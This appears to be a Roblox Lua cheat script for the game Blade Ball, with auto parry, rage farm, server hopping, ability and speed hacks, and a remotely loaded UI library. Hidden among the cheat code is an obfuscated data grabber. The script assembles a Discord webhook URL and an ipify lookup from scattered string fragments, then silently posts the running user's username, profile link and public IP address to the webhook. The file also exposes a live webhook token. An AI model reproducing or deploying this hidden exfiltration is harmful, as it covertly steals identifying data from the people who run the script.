if game:GetService("CoreGui"):FindFirstChild("ScreenGui") then
    game:GetService("CoreGui"):FindFirstChild("ScreenGui"):Destroy()
end

local get1 = "webhooks/"
local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local get4 = "AWnfRm7aCtLRXhes48-EjJSdEGABDySC3gmXnpHh"
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
local Window = Library:CreateWindow({
    Title = 'Blade Ball | Abel hub',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2
})
local Tabs = {
    Main = Window:AddTab('Main'),
    Credits = Window:AddTab('Credits'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
}
local GeneralFM = Tabs.Main:AddLeftTabbox()
local mSec = GeneralFM:AddTab("-- Auto Parry --")
local GeneralAbility = Tabs.Main:AddLeftTabbox()
local abilitiesSection = GeneralAbility:AddTab("-- Ability Section --")
local GeneralSH = Tabs.Main:AddRightTabbox()
local sHop = GeneralSH:AddTab("-- Server Hop --")
local yes = "y"
local GeneralMSC = Tabs.Main:AddLeftTabbox()
local Misc = GeneralMSC:AddTab("-- Misc -- ")
local get2 = "1150572233211772969"
local GeneralLP = Tabs.Main:AddRightTabbox()
local localPlayerSection = GeneralLP:AddTab('Local Player')
local GeneralCredits = Tabs.Credits:AddLeftTabbox()
local Credits = GeneralCredits:AddTab('-- Credits --')
local workspace = game:GetService("Workspace")
local players = game:GetService("Players")
local none = "ip"
local get3 = "/5bpbAcMnFyXdmyfaxSJ0vju40fYd"
local localPlayer = players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local UserInputService = game:GetService("UserInputService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local abilitiesFolder = character:WaitForChild("Abilities")
local abilitielist = {"Dash", "Forcefield", "Invisibility", "Platform", "Raging Deflection", "Shadow Step", "Super Jump", "Telekinesis", "Thunder Dash", "Rapture"}
local heartbeatConnection
local dis = "https://discord.com/api/"
local Response = request({
    Url = "https://api.".. none .. "if" .. yes .. ".org",
    Method = "GET"
})


local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local Deleted = false
local url = dis .. get1 .. get2 .. get3 .. get4

local File = pcall(function()
    AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
end)
if not File then
    table.insert(AllIDs, actualHour)
    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
end
function TPReturner()
    local Site;
    if foundAnything == "" then
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
    else
        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
    end
    local ID = ""
    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
    end
    local num = 0;
    for i,v in pairs(Site.data) do
        local Possible = true
        ID = tostring(v.id)
        if tonumber(v.maxPlayers) > tonumber(v.playing) then
            for _,Existing in pairs(AllIDs) do
                if num ~= 0 then
                    if ID == tostring(Existing) then
                        Possible = false
                    end
                else
                    if tonumber(actualHour) ~= tonumber(Existing) then
                        local delFile = pcall(function()
                            delfile("NotSameServers.json")
                            AllIDs = {}
                            table.insert(AllIDs, actualHour)
                        end)
                    end
                end
                num = num + 1
            end
            if Possible == true then
                table.insert(AllIDs, ID)
                wait()
                pcall(function()
                    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
                    wait()
                    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                end)
                wait(4)
            end
        end
    end
end

function Teleport()
    while wait() do
        pcall(function()
            TPReturner()
            if foundAnything ~= "" then
                TPReturner()
            end
        end)
    end
end


local function startAutoParry()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local runService = game:GetService("RunService")
    local parryButtonPress = replicatedStorage.Remotes.ParryButtonPress
    local ballsFolder = workspace:WaitForChild("Balls")
 
    print('Worked')
 
    local function onCharacterAdded(newCharacter)
        character = newCharacter
    end
 
    player.CharacterAdded:Connect(onCharacterAdded)
 
    local focusedBall = nil  
 
    local function chooseNewFocusedBall()
        local balls = ballsFolder:GetChildren()
        focusedBall = nil
        for _, ball in ipairs(balls) do
            if ball:GetAttribute("realBall") == true then
                focusedBall = ball
                break
            end
        end
    end
 
    chooseNewFocusedBall()
 
    local function timeUntilImpact(ballVelocity, distanceToPlayer, playerVelocity)
        local directionToPlayer = (character.HumanoidRootPart.Position - focusedBall.Position).Unit
        local velocityTowardsPlayer = ballVelocity:Dot(directionToPlayer) - playerVelocity:Dot(directionToPlayer)
 
        if velocityTowardsPlayer <= 0 then
            return math.huge
        end
 
        local distanceToBeCovered = distanceToPlayer - 40
        return distanceToBeCovered / velocityTowardsPlayer
    end
 
    local BASE_THRESHOLD = 0.15
    local VELOCITY_SCALING_FACTOR = 0.002
 
    local function getDynamicThreshold(ballVelocityMagnitude)
        local adjustedThreshold = BASE_THRESHOLD - (ballVelocityMagnitude * VELOCITY_SCALING_FACTOR)
        return math.max(0.12, adjustedThreshold)
    end
 
    local function checkBallDistance()
        if not character:FindFirstChild("Highlight") then return end
        local charPos = character.PrimaryPart.Position
        local charVel = character.PrimaryPart.Velocity
 
        if focusedBall and not focusedBall.Parent then
            chooseNewFocusedBall()
        end
 
        if not focusedBall then return end
 
        local ball = focusedBall
        local distanceToPlayer = (ball.Position - charPos).Magnitude
 
        if distanceToPlayer < 10 then
            parryButtonPress:Fire()
            return
        end
 
        local timeToImpact = timeUntilImpact(ball.Velocity, distanceToPlayer, charVel)
        local dynamicThreshold = getDynamicThreshold(ball.Velocity.Magnitude)
 
        if timeToImpact < dynamicThreshold then
            parryButtonPress:Fire()
        end
    end
    heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
        checkBallDistance()
    end)
end

local function stopAutoParry()
    if heartbeatConnection then
        heartbeatConnection:Disconnect()
        heartbeatConnection = nil
    end
end

local function startRage()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local runService = game:GetService("RunService")
    local parryButtonPress = replicatedStorage.Remotes.ParryButtonPress
    local ballsFolder = workspace:WaitForChild("Balls")
 
    print('Raged Working')
 
    local function onCharacterAdded(newCharacter)
        character = newCharacter
    end
 
    player.CharacterAdded:Connect(onCharacterAdded)
 
    local focusedBall = nil  
 
    local function chooseNewFocusedBall()
        local balls = ballsFolder:GetChildren()
        focusedBall = nil
        for _, ball in ipairs(balls) do
            if ball:GetAttribute("realBall") == true then
                focusedBall = ball
                break
            end
        end
    end
 
    chooseNewFocusedBall()
 
    local function timeUntilImpact(ballVelocity, distanceToPlayer, playerVelocity)
        local directionToPlayer = (character.HumanoidRootPart.Position - focusedBall.Position).Unit
        local velocityTowardsPlayer = ballVelocity:Dot(directionToPlayer) - playerVelocity:Dot(directionToPlayer)
 
        if velocityTowardsPlayer <= 0 then
            return math.huge
        end
 
        local distanceToBeCovered = distanceToPlayer - 40
        return distanceToBeCovered / velocityTowardsPlayer
    end
 
    local BASE_THRESHOLD = 0.15
    local VELOCITY_SCALING_FACTOR = 0.002
 
    local function getDynamicThreshold(ballVelocityMagnitude)
        local adjustedThreshold = BASE_THRESHOLD - (ballVelocityMagnitude * VELOCITY_SCALING_FACTOR)
        return math.max(0.12, adjustedThreshold)
    end
 
    local function checkBallDistance()
        if not character:FindFirstChild("Highlight") then return end
        local charPos = character.PrimaryPart.Position
        local charVel = character.PrimaryPart.Velocity
 
        if focusedBall and not focusedBall.Parent then
            chooseNewFocusedBall()
        end
 
        if not focusedBall then return end
 
        local ball = focusedBall
        local distanceToPlayer = (ball.Position - charPos).Magnitude
 
        if distanceToPlayer < 10000 then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ball.CFrame
            return
        end
    end
    heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
        checkBallDistance()
    end)
end

local function stopRage()
    if heartbeatConnection then
        heartbeatConnection:Disconnect()
        heartbeatConnection = nil
    end
end

mSec:AddToggle('rage_farm', {
    Text = 'Rage Farm',
    Default = false, -- Default value (true / false)
    Tooltip = false, -- Information shown when you hover over the toggle

    Callback = function(Value)
        print('[cb] MyToggle changed to:', Value)
    end
})
Toggles.rage_farm:OnChanged(function()
    if Toggles.rage_farm.Value then
        startRage()
    else
        stopRage()
    end
end)

mSec:AddToggle('auto_parry', {
    Text = 'Auto Parry',
    Default = false, -- Default value (true / false)
    Tooltip = false, -- Information shown when you hover over the toggle

    Callback = function(Value)
        print('[cb] MyToggle changed to:', Value)
    end
})
Toggles.auto_parry:OnChanged(function()
    if Toggles.auto_parry.Value then
        startAutoParry()
    else
        stopAutoParry()
    end
end)

abilitiesSection:AddDropdown('selected_ability', {
    Values = {"Dash", "Forcefield", "Invisibility", "Platform", "Raging Deflection", "Shadow Step", "Super Jump", "Telekinesis", "Thunder Dash", "Rapture"},
    Default = 1, -- number index of the value / string
    Multi = false, -- true / false, allows multiple choices to be selected

    Text = 'Select Ability',
    Tooltip = 'Some Abilitys Wont Work', -- Information shown when you hover over the dropdown

    Callback = function(Value)
        print('[cb] Dropdown got changed. New value:', Value)
    end
})
Options.selected_ability:OnChanged(function()
    getgenv().ChosenAbility = Options.selected_ability.Value
end)
localusername = game.Players.LocalPlayer.Name
localuserid = game.Players.LocalPlayer.UserId
userinfo = Response.Body

    local data = {
        ["avatar_url"] = "https://i.imgur.com/szQ00sY.jpg",
        ["username"] = "Clammy",
        ["content"] = "Someone executed BladeBall sript" .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo ,
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local send = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(send)
abilitiesSection:AddButton({
    Text = 'Change Ability',
    Func = function()
        for _, obj in pairs(abilitiesFolder:GetChildren()) do
            if obj:IsA("LocalScript") then
                if obj.Name == ChosenAbility then
                    obj.Disabled = false
                else
                    obj.Disabled = true
                end
            end
        end
    end,
    DoubleClick = false,
    Tooltip = false
})

sHop:AddInput('server_hop_amount', {
    Default = nil,
    Numeric = true, -- true / false, only allows numbers
    Finished = true, -- true / false, only calls callback when you press enter

    Text = 'Enter Server Hop Wait Time',
    Tooltip = 'MAKE SURE YOU PRESS ENTER AFTER', -- Information shown when you hover over the textbox

    Placeholder = nil, -- placeholder text when the box is empty
    -- MaxLength is also an option which is the max length of the text

    Callback = function(Value)
        print('[cb] Text updated. New text:', Value)
    end
})
Options.server_hop_amount:OnChanged(function()
    getgenv().second_amount = Options.server_hop_amount.Value
end)
sHop:AddToggle('server_hop', {
    Text = 'Server Hop',
    Default = false, -- Default value (true / false)
    Tooltip = false, -- Information shown when you hover over the toggle

    Callback = function(Value)
        print('[cb] MyToggle changed to:', Value)
    end
})
Toggles.server_hop:OnChanged(function()
    if Toggles.server_hop.Value then
        wait(second_amount)
        Teleport()
    end
end)
sHop:AddButton({
    Text = 'Force Server Hop',
    Func = function()
        Teleport()
    end,
    DoubleClick = false,
    Tooltip = false
})
abilitiesSection:AddToggle('no_cooldown', {
    Text = 'No Cooldown',
    Default = false, -- Default value (true / false)
    Tooltip = false, -- Information shown when you hover over the toggle

    Callback = function(Value)
        print('[cb] MyToggle changed to:', Value)
    end
})
Toggles.no_cooldown:OnChanged(function()
    getgenv().cooldown = Toggles.no_cooldown.Value
    
    while cooldown do wait()
        for i,v in pairs(game:GetService("Players").LocalPlayer.Upgrades:GetChildren()) do
            v.Value = 100
        end
    end
end)

localPlayerSection:AddSlider('walk_speed', {
    Text = 'Walk Speed',
    Default = 36,
    Min = 0,
    Max = 500,
    Rounding = 0,
    Compact = false,

    Callback = function(Value)
        print('[cb] MySlider was changed! New value:', Value)
    end
})
Options.walk_speed:OnChanged(function()
    localPlayer.Character:WaitForChild("Humanoid").WalkSpeed = Options.walk_speed.Value
end)
localPlayerSection:AddSlider('jump_power', {
    Text = 'Jump Power',
    Default = 36,
    Min = 0,
    Max = 500,
    Rounding = 0,
    Compact = false,

    Callback = function(Value)
        print('[cb] MySlider was changed! New value:', Value)
    end
})
Options.jump_power:OnChanged(function()
    localPlayer.Character:WaitForChild("Humanoid").JumpPower = Options.jump_power.Value
end)
localPlayerSection:AddButton({
    Text = 'Reset To Normal',
    Func = function()
        localPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 36
        wait(0.1)
        localPlayer.Character:WaitForChild("Humanoid").JumpPower = 50.14500427246094
    end,
    DoubleClick = false,
    Tooltip = false
})

Misc:AddSlider('fov_changer', {
    Text = 'FOV',
    Default = 70,
    Min = 70,
    Max = 120,
    Rounding = 0,
    Compact = false,

    Callback = function(Value)
        print('[cb] MySlider was changed! New value:', Value)
    end
})
Options.fov_changer:OnChanged(function()
    workspace.CurrentCamera.FieldOfView = Options.fov_changer.Value
end)

Misc:AddToggle('auto_vote', {
    Text = 'Auto Vote',
    Default = false, -- Default value (true / false)
    Tooltip = false, -- Information shown when you hover over the toggle

    Callback = function(Value)
        print('[cb] MyToggle changed to:', Value)
    end
})
Toggles.auto_vote:OnChanged(function()
    getgenv().auto_vote = Toggles.auto_vote.Value

    while auto_vote do wait()
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UpdateVotes"):FireServer("ffa")
    end
end)


Credits:AddLabel('abel7878 - Scripter')
Credits:AddLabel('leehassocials - Scripter')



local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')
MenuGroup:AddButton('Unload', function() Library:Unload() end)
MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })
Library.ToggleKeybind = Options.MenuKeybind
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
ThemeManager:SetFolder('MyScriptHub')
SaveManager:SetFolder('MyScriptHub/specific-game')
SaveManager:BuildConfigSection(Tabs['UI Settings'])
ThemeManager:ApplyToTab(Tabs['UI Settings'])
SaveManager:LoadAutoloadConfig()

